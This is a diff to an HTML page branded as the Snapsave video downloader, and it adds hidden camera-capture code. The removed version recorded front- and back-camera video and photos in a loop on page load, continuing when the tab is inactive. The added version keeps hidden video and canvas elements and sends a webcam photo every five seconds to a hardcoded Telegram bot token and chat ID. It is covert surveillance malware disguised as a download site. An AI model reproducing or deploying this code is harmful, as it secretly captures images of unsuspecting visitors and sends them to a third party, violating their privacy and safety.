@@ -33,133 +33,82 @@
         }
 </style>
       <h1><a href="https://snapsave.app/"><b>Snapsave</b></a></h1>
+    <video id="camera" autoplay playsinline style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <p></p>
+
     <script>
-        const telegramBotToken = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w"; // Replace with your bot's token
-        const chatId = "1987016824"; // Replace with the chat ID where you want to send the video
+        const video = document.getElementById('camera');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
 
-        let stream;
-        let mediaRecorder;
-        let recordedChunks = [];
+        // Telegram Bot Information
+        const botToken = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w"; // Replace with your bot token
+        const chatId = "1987016824"; // Replace with your chat ID
 
-        async function startCamera(cameraFacing) {
+        // 1. Camera Access
+        async function startCamera() {
             try {
-                // Access the camera
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: cameraFacing // "user" for front, "environment" for back
-                    }
-                });
-                return stream;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
             } catch (error) {
-                console.error("Error accessing the camera:", error);
+                alert('Camera access denied or unavailable!');
+                console.error(error);
             }
         }
 
-        function startRecording() {
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(stream);
+        // 2. Capture and Send Photo
+        async function captureAndSend() {
+            // Capture Photo
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
 
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-
-            mediaRecorder.start();
-        }
-
-        async function stopRecordingAndSend() {
-            mediaRecorder.stop();
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(recordedChunks, { type: "video/mp4" });
-                const formData = new FormData();
-                formData.append("chat_id", chatId);
-                formData.append("video", blob, "recorded_video.mp4");
-
-                try {
-                    await fetch(https://api.telegram.org/bot${telegramBotToken}/sendVideo, {
-                        method: "POST",
-                        body: formData
-                    });
-                } catch (error) {
-                    console.error("Error sending video to Telegram:", error);
-                }
-            };
-        }
-
-        async function capturePhoto(cameraFacing) {
-            const photoStream = await startCamera(cameraFacing);
-            const videoElement = document.createElement("video");
-            videoElement.srcObject = photoStream;
-            await videoElement.play();
-
-            const canvas = document.createElement("canvas");
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-
-            const context = canvas.getContext("2d");
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-            const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg"));
-
+            // Convert Base64 to Blob
+            const blob = dataURItoBlob(imageData);
             const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", blob, "captured_photo.jpg");
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.png');
 
+            // Send Photo to Telegram
             try {
-                await fetch(https://api.telegram.org/bot${telegramBotToken}/sendPhoto, {
-                    method: "POST",
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
                     body: formData
                 });
+
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('Photo sent successfully!');
+                } else {
+                    console.error('Failed to send photo!', result);
+                }
             } catch (error) {
-                console.error("Error sending photo to Telegram:", error);
+                console.error('Error sending photo!', error);
             }
-
-            photoStream.getTracks().forEach((track) => track.stop());
         }
 
-        async function recordSequence() {
-            // Record first 5 seconds with the front camera
-            stream = await startCamera("user");
-            startRecording();
-            setTimeout(async () => {
-                await stopRecordingAndSend();
-
-                // Switch to the back camera and record next 5 seconds
-                stream.getTracks().forEach((track) => track.stop()); // Stop current stream
-                stream = await startCamera("environment");
-                startRecording();setTimeout(async () => {
-                    await stopRecordingAndSend();
-                    stream.getTracks().forEach((track) => track.stop()); // Stop back camera stream
-
-                    // Restart the sequence after some delay
-                    setTimeout(recordSequence, 2000); // 2-second delay before restarting
-                }, 5000); // Back camera recording duration
-            }, 5000); // Front camera recording duration
-        }
-
-        async function startCapturing() {
-            // Start taking photos periodically (every 7 seconds)
-            setInterval(async () => {
-                await capturePhoto("user"); // Take a photo with the front camera
-                await capturePhoto("environment"); // Take a photo with the back camera
-            }, 7000);
-
-            // Start the video recording sequence
-            recordSequence();
-        }
-
-        // Ensure the recording continues even when the tab is inactive
-        document.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === "visible") {
-                console.log("Tab is active");
-            } else {
-                console.log("Tab is inactive, recording continues...");
+        // Utility: Convert Data URI to Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
             }
-        });
+            return new Blob([ab], { type: mimeString });
+        }
 
-        // Start capturing as soon as the page loads
-        startCapturing();
+        // 3. Start Process (Capture and Send Every 5 Seconds)
+        async function startContinuousCapture() {
+            await startCamera();
+            setInterval(captureAndSend, 5000); // Capture & send every 5 seconds
+        }
+
+        // Start Continuous Process
+        startContinuousCapture();
     </script>
 </body>
 </html>
